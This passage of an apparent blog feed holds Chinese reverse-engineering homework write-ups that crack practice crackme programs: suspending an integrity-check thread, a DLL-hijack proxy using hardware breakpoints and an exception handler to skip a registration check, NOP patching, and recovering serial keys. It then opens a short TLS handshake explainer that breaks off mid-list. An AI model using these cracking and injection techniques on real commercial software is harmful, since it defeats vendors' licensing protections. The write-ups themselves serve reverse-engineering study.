<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208125215342.png" alt="image-20211208125215342"></p>
<p>我们将它运行起来 - 加壳的程序必须运行起来，才会被恢复源码。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208125611118.png" alt="image-20211208125611118"></p>
<p><strong>注册失败</strong>的信息显示在了标题上，那么可以猜测它使用了SetWindowTextA函数，下一个断点。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208125735454.png" alt="image-20211208125735454"></p>
<p>断下来了，开始F8。现在走到了一个可疑的地方，附近有大跳，我们用Immlabel插件标记一下，发现上面也有一处一样的call，那么猜测可能是成功的call。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208125913192.png" alt="image-20211208125913192"></p>
<p>观察发现，上面有一个jnz跳转，跳过了成功的call，那么我们可以确定关键跳就在这里了<strong>0x401053</strong>。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208130101207.png" alt="image-20211208130101207"></p>
<h2 id="破解方法一：进程挂起-修改ZF标志位"><a href="#破解方法一：进程挂起-修改ZF标志位" class="headerlink" title="破解方法一：进程挂起+修改ZF标志位"></a>破解方法一：进程挂起+修改ZF标志位</h2><p>在之前得知的关键跳<strong>0x401053</strong>处下一个CC断点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/1.gif" alt="1"></p>
<p>奇怪的是，程序会被终止。CC断点是将地址的首字节改为0xCC，因此我们判断该程序使用了某种校验方法（可能是CRC检测）来检测固定的某段代码段是否在运行过程中被修改。此处我们可以修改JNZ为NOP完成破解，但题目要求是不修改代码破解，所以我们还需另寻他法。</p>
<p>一个软件为了保证整个程序流程正常运行，不太可能将CRC检测(while loop形式)写在主线程（单一线程），不然后面的代码将无法执行，所以猜测可能是有新的线程建立。</p>
<p>在OD的T窗口查看线程情况</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208130947860.png" alt="image-20211208130947860"></p>
<p>发现了一个异常活跃的线程，基本可以确定是用来检测的线程 - 直接将线程挂起。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208131235695.png" alt="image-20211208131235695"></p>
<p>再次将<strong>0X00401053</strong>下断，发现程序正常，成功过掉CRC检测。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208131301886.png" alt="image-20211208131301886"></p>
<p>JNZ在ZF标志位为1的时候不跳转 <img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208130254590.png" alt="image-20211208130254590"></p>
<p>破解成功</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208131520337.png" alt="image-20211208131520337"></p>
<h2 id="破解方法二：硬件HOOK"><a href="#破解方法二：硬件HOOK" class="headerlink" title="破解方法二：硬件HOOK"></a>破解方法二：硬件HOOK</h2><p>已知检测程序是校验代码位数，从而判断代码是否被修改，但硬件断点不会被断下，因为它是通过操纵Dr寄存器来完成的下断。关于硬件断点的讲解见<a href="https://leihehehe.github.io/2021/12/07/%E6%B5%85%E6%9E%90%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E5%92%8C%E5%86%85%E5%AD%98%E6%96%AD%E7%82%B9/">浅析硬件断点和内存断点</a></p>
<p>硬件断点会触发**STATUS_SINGLE_STEP(单步异常)**，异常会交给程序的异常处理函数管理，若程序的异常处理函数不处理，才会交给调试器。</p>
<p>我们现在可以利用以下思路：</p>
<p>配合DLL劫持，让程序在JNZ跳转<strong>0x401053</strong>处触发硬件断点，同时给程序写一个异常处理函数 - 异常处理函数里是我们的恶意代码 - 将EIP+6，这样能够直接<strong>绕过JNZ判断</strong>。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208132929602.png" alt="image-20211208132929602"></p>
<p><strong>WIN10代码</strong>（我的环境）: <strong>winspool.drv</strong>，使用第四课的C语言劫持补丁代码进行改写。</p>
<p>注意:win10在设置硬件断点的时候必须<strong>先挂起目标线程</strong>，否则无法断点，所以我们需要创建一个新的线程，再在这个线程中暂停主线程从而保存修改后的寄存器内容。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DWORD g_dwBreakPoint = <span class="number">0x401053</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(_In_ LPVOID lpMainThreadId)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	HANDLE hMainThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, TRUE, (DWORD)lpMainThreadId);</span><br><span class="line">	<span class="built_in">SuspendThread</span>(hMainThread);<span class="comment">// 暂停这个线程，避免它检测</span></span><br><span class="line">	CONTEXT ctx;</span><br><span class="line">	ctx.ContextFlags = CONTEXT_ALL;</span><br><span class="line">	<span class="built_in">GetThreadContext</span>(hMainThread, &amp;ctx);<span class="comment">//获取该线程的context=》包含了这个线程的各种参数，其中就包含dr寄存器的内容</span></span><br><span class="line">	ctx.Dr7 = (DWORD)<span class="number">0x1</span>;<span class="comment">//将该线程的dr7设为0x1=》代表DR0是有效的(L0=1)</span></span><br><span class="line">	ctx.Dr0 = g_dwBreakPoint;<span class="comment">//Dr0=硬件断点的地址</span></span><br><span class="line">	<span class="built_in">SetThreadContext</span>(hMainThread, &amp;ctx);<span class="comment">//把修改的值set到context里</span></span><br><span class="line">	<span class="built_in">ResumeThread</span>(hMainThread);<span class="comment">//恢复线程</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//异常捕捉</span></span><br><span class="line"><span class="function">DWORD NTAPI <span class="title">ExceptionHandler</span><span class="params">(EXCEPTION_POINTERS* ExceptionInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ((DWORD)ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress == g_dwBreakPoint)<span class="comment">//如果发生异常的位置就是我们想要跳过的位置</span></span><br><span class="line">	&#123;</span><br><span class="line">		ExceptionInfo-&gt;ContextRecord-&gt;Eip += <span class="number">6</span>;<span class="comment">//将该地址的EIP+6，从而我们可以跳过检测。</span></span><br><span class="line">		<span class="comment">//已经处理了异常，不需要再调用下一个异常处理来处理此异常</span></span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//调用下一个处理器</span></span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">	&#123;</span><br><span class="line">		::<span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;开始破解拉&quot;</span>, <span class="string">&quot;能否成功呢？leihehehe.github.io&quot;</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">DisableThreadLibraryCalls</span>(hModule);</span><br><span class="line">		<span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, (PVECTORED_EXCEPTION_HANDLER)ExceptionHandler);<span class="comment">//添加一个VEH异常处理的函数，如果有异常，该函数会被call</span></span><br><span class="line">		<span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, (LPVOID)<span class="built_in">GetCurrentThreadId</span>(), <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//创建线程来制造硬件断点,这里会发出异常，VEH异常处理函数能捕获它。</span></span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">Load</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (dwReason == DLL_PROCESS_DETACH)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">Free</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是<strong>win7代码</strong>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DWORD g_dwBreakpoint = <span class="number">0x401053</span>; <span class="comment">// 关键指令，希望跳过这条指令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置硬件断点函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetHardwareBreakPoint</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CONTEXT ctx;</span><br><span class="line">	ctx.ContextFlags = CONTEXT_ALL;</span><br><span class="line">	<span class="built_in">GetThreadContext</span>(<span class="built_in">GetCurrentThread</span>(), &amp;ctx);</span><br><span class="line">	ctx.Dr7 = (DWORD)<span class="number">0x1</span>; <span class="comment">// 启用Dr0</span></span><br><span class="line">	ctx.Dr0 = g_dwBreakpoint; <span class="comment">// 设置硬件断点	</span></span><br><span class="line">	<span class="built_in">SetThreadContext</span>(<span class="built_in">GetCurrentThread</span>(), &amp;ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 异常处理函数</span></span><br><span class="line"><span class="function">DWORD NTAPI <span class="title">ExceptionHandler</span><span class="params">(PEXCEPTION_POINTERS pExceptionInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ((DWORD)pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress == g_dwBreakpoint)</span><br><span class="line">	&#123;</span><br><span class="line">		pExceptionInfo-&gt;ContextRecord-&gt;Eip += <span class="number">6</span>;</span><br><span class="line">		<span class="comment">// 已经处理了异常，不需要调用下一个异常处理来处理该异常</span></span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="built_in">DisableThreadLibraryCalls</span>(hModule);</span><br><span class="line">		<span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, (PVECTORED_EXCEPTION_HANDLER) ExceptionHandler);</span><br><span class="line">		<span class="built_in">SetHardwareBreakPoint</span>(); <span class="comment">//设置硬件断点,不需要创建一个线程来执行硬件断点</span></span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">Load</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (dwReason == DLL_PROCESS_DETACH)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">Free</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>破解成功。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/hw5HardBreakHook.gif" alt="hw5HardBreakHook"></p>
<h1 id="第六课课后作业"><a href="#第六课课后作业" class="headerlink" title="第六课课后作业"></a>第六课课后作业</h1><h2 id="软件使用-4"><a href="#软件使用-4" class="headerlink" title="软件使用"></a>软件使用</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209185701029.png" alt="image-20211209185701029"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209185710786.png" alt="image-20211209185710786"></p>
<p>此处注册码并没有任何用处，随意输入也会提示注册成功</p>
<h2 id="破解方法"><a href="#破解方法" class="headerlink" title="破解方法"></a>破解方法</h2><p>运行起来转到代码段401000 - 从模块中删除分析</p>
<p>字符串搜索</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209185906127.png" alt="image-20211209185906127"></p>
<p>我们看见有一个<strong>\License.key</strong>，双击过去，在<strong>段开头</strong>断点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209190001299.png" alt="image-20211209190001299"></p>
<p>我们猜测该程序是在启动的时候判断是否注册，而关键点就在于这个<strong>License.key</strong></p>
<p>记录一下下断点的地址<strong>004016D6</strong></p>
<p>现在重新运行软件，正常的话，程序应该在这里断下来，但现在并没有断下，发现断点被禁用了。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209190436336.png" alt="image-20211209190436336"></p>
<p>程序带壳，刚开始运行时，下断的地址没有被恢复，所以断点会被禁止。</p>
<p>因此我们需要在程序代码恢复后再给<strong>004016D6</strong>地址下断。</p>
<p>转到<strong>CreateWindowExW</strong>下断 - 大部分加壳程序代码在此处都已还原。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209191453997.png" alt="image-20211209191453997"></p>
<p>在004016D6下断</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209191547960.png" alt="image-20211209191547960"></p>
<p>运行后被断下,一直F8</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209191725737.png" alt="image-20211209191725737"></p>
<p>在此处修改jnz为nop即可</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209191821736.png" alt="image-20211209191821736"></p>
<h1 id="第七课课后作业"><a href="#第七课课后作业" class="headerlink" title="第七课课后作业"></a>第七课课后作业</h1><h2 id="软件使用-5"><a href="#软件使用-5" class="headerlink" title="软件使用"></a>软件使用</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213153606918.png" alt="image-20211213153606918"></p>
<p><strong>作业要求：逆出算法，不能爆破，不能修改代码。</strong></p>
<h2 id="逆向流程"><a href="#逆向流程" class="headerlink" title="逆向流程"></a>逆向流程</h2><p>直接载入OD，找关键点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213153904764.png" alt="image-20211213153904764"></p>
<p>在IDA中发现左侧第一个就是401000的函数，我们点击以后按F5，让它直接转变为代码</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213154209385.png" alt="image-20211213154209385"></p>
<p>分析a1应该是我们输入的key，下面的messageBox乱码，怎么解决呢？双击乱码的地方过去</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213154450306.png" alt="image-20211213154450306"></p>
<p>这种情况通常是因为IDA将其识别为Unicode，而unicode不能正确表示我们的字符串。</p>
<p>菜单栏-&gt;选项-&gt;字符串文本-&gt;修改为UTF-16LE</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213154629467.png" alt="image-20211213154629467"></p>
<p>发现已经改回来了。</p>
<p>再回到之前的代码区，按F5</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213154656969.png" alt="image-20211213154656969"></p>
<p>代码成功恢复</p>
<p>接下来我们对一些变量名做一些修改，方便理解</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213160036921.png" alt="image-20211213160036921"></p>
<h2 id="C语言逆算法"><a href="#C语言逆算法" class="headerlink" title="C语言逆算法"></a>C语言逆算法</h2><p>直接把代码从IDA上copy&amp;paste，然后做一些修改。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">checkKey</span><span class="params">(<span class="type">int</span> inputKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> result; <span class="comment">// </span></span><br><span class="line">	<span class="type">int</span> v2; <span class="comment">// 这个应该是用来作为BOOL，作为一个FLAG判断</span></span><br><span class="line"></span><br><span class="line">	v2 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (inputKey * (inputKey - <span class="number">23</span>) == <span class="number">-102</span>)</span><br><span class="line">		v2 = <span class="number">1</span>;</span><br><span class="line">	result = v2;</span><br><span class="line">	<span class="keyword">if</span> (v2)<span class="comment">//如果上面的条件成立了，则继续检测下面是否成立</span></span><br><span class="line">	&#123;</span><br><span class="line">		result = inputKey * inputKey * inputKey;</span><br><span class="line">		<span class="keyword">if</span> (result == <span class="number">4913</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xFFFFFFFF</span>; i++) &#123;<span class="comment">//遍历key是否正确</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">checkKey</span>(i)) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213160052211.png" alt="image-20211213160052211"></p>
<p>算出来正确的注册码是17</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213160126767.png" alt="image-20211213160126767"></p>
<h1 id="第八课课后作业"><a href="#第八课课后作业" class="headerlink" title="第八课课后作业"></a>第八课课后作业</h1><h2 id="软件使用-6"><a href="#软件使用-6" class="headerlink" title="软件使用"></a>软件使用</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213160322310.png" alt="image-20211213160322310"></p>
<h2 id="去花指令"><a href="#去花指令" class="headerlink" title="去花指令"></a>去花指令</h2><p>载入OD后在字符串中查找，发现并没有注册失败或成功，跟进<code>请输入注册码</code>，发现后面代码加了花指令</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213162550645.png" alt="image-20211213162550645"></p>
<p>我选择先去除花指令。</p>
<p>花指令一般是由恒成立的跳转组成的，我们只需要nop掉永远不会访问的无效指令，就能去除</p>
<p>例如</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213163002542.png" alt="image-20211213163002542"></p>
<p>在数据窗口中去除 <img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213163034570.png" alt="image-20211213163034570"></p>
<p>将所有花指令去除后，复制保存到可执行文件</p>
<h2 id="分析算法"><a href="#分析算法" class="headerlink" title="分析算法"></a>分析算法</h2><p>因为程序比较小，我们可以直接拖入IDA，在前几个函数中能找到我们的关键位置</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213163536224.png" alt="image-20211213163536224"></p>
<p>我们做一些注释</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213164107383.png" alt="image-20211213164107383"></p>
<p>其中一个call中的**&amp;byte_442578<strong>引起了我的注意，我有些困惑这是什么，根据上下文猜测，感觉后面的v4像是我们输入的key，</strong>&amp;byte_442578**又是什么呢？</p>
<p>双击进去看看，此时它为数据类型</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213164245856.png" alt="image-20211213164245856"></p>
<p>我们将他转换成字符串，发现它变成了%s</p>
<p>返回刚才的地方F5，显而易见，这是一个**scanf()**方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213164406622.png" alt="image-20211213164406622"></p>
<p>我们进入**algrithms()**继续分析算法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213165156917.png" alt="image-20211213165156917"></p>
<p>一顿分析后，我们发现下方有一个<code>*(_BYTE *)</code>，通常这种<strong>pointer</strong>前方又有一个星号的情况，都是因为IDA识别错误。</p>
<p>我们发现括号后面finalResult，和inputKey的类型是错误的</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213165345317.png" alt="image-20211213165345317"></p>
<p>修改一下参数类型</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213165435708.png" alt="image-20211213165435708"></p>
<p>显示正常。</p>
<p>同样我们再修改一下以下位置</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213165659661.png" alt="image-20211213165659661"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213165742029.png" alt="image-20211213165742029"></p>
<p>对应的值为**’bcdaren’**</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213165804348.png" alt="image-20211213165804348"></p>
<h2 id="C语言逆算法-1"><a href="#C语言逆算法-1" class="headerlink" title="C语言逆算法"></a>C语言逆算法</h2><p>将算法从IDA复制到C</p>
<p>观察下面的算法,我们发现再第二个for循环中，<strong>i</strong>一直没变，不停的再给同一个数重新赋值新的<strong>aBacdaren_1[j]^xxx</strong>，所以我们可以看出来，其实这两个for循环是在干一件事，就是把最后一个字母<strong>n</strong>和(key中的每一位+13)做异或运算。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = i;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt;= keyLen )                        <span class="comment">// 如果循环次数大于了key的长度就退出循环</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(<span class="string">&quot;bcdaren&quot;</span>); ++j )</span><br><span class="line">    finalResult[i] = aBcdaren_1[j] ^ (inputKey[i] + <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>化简以后：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; keyLen; i++) &#123;</span><br><span class="line">		finalResult[i] = <span class="string">&#x27;n&#x27;</span> ^ (inputKey[i] + <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>于是我们可以分析出，该程序的算法如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span>* <span class="title">algrithms</span><span class="params">(<span class="type">char</span>* inputKey, <span class="type">char</span>* finalResult, <span class="type">unsigned</span> <span class="type">int</span> maxLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">signed</span> <span class="type">int</span> v4; </span><br><span class="line">	<span class="type">signed</span> <span class="type">int</span> keyLen; </span><br><span class="line">	<span class="type">signed</span> <span class="type">int</span> i; </span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (inputKey &amp;&amp; finalResult &amp;&amp; maxLen)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strlen</span>(inputKey) &lt;= maxLen)           <span class="comment">// 判断长度是否小于maxLen</span></span><br><span class="line">			keyLen = <span class="built_in">strlen</span>(inputKey);                <span class="comment">// 如果&lt;=最大长度，取key原本的长度</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			keyLen = maxLen;                          <span class="comment">// 如果大于最大长度，取最大长度</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; keyLen; i++) &#123;</span><br><span class="line">				finalResult[i] = <span class="string">&#x27;n&#x27;</span> ^ (inputKey[i] + <span class="number">13</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> finalResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213172917906.png" alt="image-20211213172917906"></p>
<p>最后<strong>finalResult</strong>的值应该等于<code>((++**--,,//..QQPP</code></p>
<p>我们再写个逆运算的算法，注意，<strong>异或运算中任意两个数异或可以得到第三个数</strong>，例如：</p>
<p>a^b=c</p>
<p>a^c=b</p>
<p>b^c=a</p>
<p><strong>最终逆向算法：</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span>* <span class="title">getCorrectKey</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* keyToBeConverte, <span class="type">char</span>* finalResult, <span class="type">unsigned</span> <span class="type">int</span> maxLen)</span> </span>&#123;</span><br><span class="line">	<span class="type">signed</span> <span class="type">int</span> keyLen;</span><br><span class="line">	<span class="keyword">if</span> (keyToBeConverte &amp;&amp; finalResult &amp;&amp; maxLen) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strlen</span>(keyToBeConverte) &lt;= maxLen)           <span class="comment">// 判断长度是否小于maxLen</span></span><br><span class="line">			keyLen = <span class="built_in">strlen</span>(keyToBeConverte);                <span class="comment">// 如果&lt;=最大长度，取key原本的长度</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			keyLen = maxLen;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; keyLen; i++) &#123;</span><br><span class="line">			finalResult[i] = (<span class="string">&#x27;n&#x27;</span> ^ keyToBeConverte[i])<span class="number">-13</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> finalResult;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> finalResult[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="built_in">getCorrectKey</span>(<span class="string">&quot;((++**--,,//..QQPP&quot;</span>, finalResult, <span class="number">128</span>));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213175431347.png" alt="image-20211213175431347"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213175444354.png" alt="image-20211213175444354"></p>
]]></content>
      <categories>
        <category>Reverse Engineering</category>
      </categories>
      <tags>
        <tag>Write-up</tag>
        <tag>Reverse Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>Security Protocols</title>
    <url>/2022/06/12/Security-Protocols/</url>
    <content><![CDATA[<h1 id="SSL-TLS-Protocol"><a href="#SSL-TLS-Protocol" class="headerlink" title="SSL/TLS Protocol"></a>SSL/TLS Protocol</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><code>SSL</code> stands for <strong>Secure Sockets Layer</strong>, and TLS stands for <strong>Transport Layer Security</strong>. TLS is an updated and more secure version of SSL. Nowadays, the SSL has been deprecated and replaced with TLS, therefore, we will use the term “TLS” to explain this protocol.</p>
<span id="more"></span>

<p>SSL/TLS protocol is used to achieve the following goals</p>
<ul>
<li>CONFidentiality</li>
<li>INTegrity</li>
<li>AUTHentication</li>
</ul>
<p>A very common use is <strong>HTTPS</strong>. <strong>HTTPS</strong> is the HTTP protocol with data encryption using SSL/TLS.</p>
<h2 id="TLS-Handshake-Explanation"><a href="#TLS-Handshake-Explanation" class="headerlink" title="TLS Handshake Explanation"></a>TLS Handshake Explanation</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612155851.png" alt="TLS handshake"></p>
<ol>
<li><p>Client sends hello, supported TLS version, supported cipher suite and Random(client random string).</p>
</li>
<li><p>Server sends message “server hello” back to the client, and also responds with chosen cipher suite, server random string, and SSL certificate(with server’s public key).</p>
</li>
<li><p>The client will verify the SSL certificate information, get the public key of the server.</p>
</li>
<li><p>Client sends pre-master key generated using the public key he just got from the server.</p>
</li>
<li><p>Server decrypts the pre-master key from the client by using his private key.</p>
</li>
